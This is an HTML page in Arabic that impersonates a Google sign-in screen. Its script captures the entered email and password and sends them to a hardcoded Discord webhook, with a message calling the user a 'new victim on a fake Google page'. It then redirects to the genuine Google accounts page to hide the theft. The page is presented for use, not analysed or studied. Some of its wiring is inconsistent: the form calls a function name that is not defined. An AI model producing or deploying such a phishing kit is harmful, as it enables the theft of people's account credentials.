<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول - حساب Google</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }

    .popup {
      background: white;
      padding: 20px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
      display: none;
    }

    .popup img {
 }

    .login-container h2 {
       width: 90px;
      margin-bottom: 10px;
    }

    .popup input {
      width: 90%;
      padding: 8px;
      margin: 5px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .popup button {
      padding: 10px 20px;
      border: none;
      background: #1a73e8;
      color: white;
      cursor: pointer;
      border-radius: 4px;
      margin-top: 10px;
    }

    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
    }
  </style>
</head>
<body>

<div id="login-container">
   <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
  <h2>تسجيل الدخول إلى حسابك في Google</h2>
    
    <form onsubmit="sendToDiscord(); return false;">
    
       <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
  <input type="password" id="password" placeholder="كلمة المرور" required>
      <button type="submit">التالي</button>
     </form>
   <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
</div>

<script>
  // إظهار النافذة بعد 1 ثانية
  setTimeout(() => {
    document.getElementById("overlay").style.display = "flex";
    document.getElementById("loginPopup").style.display = "block";
  }, 1000);

  function login() {
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

 var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
       var payload = {
          content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
         };
     fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(() => {
        window.location.href = "https://accounts.google.com/";
      }).catch(err => {
        alert("حدث خطأ أثناء الإرسال.");
      });
    }
  </script>
   </body>
   </html>
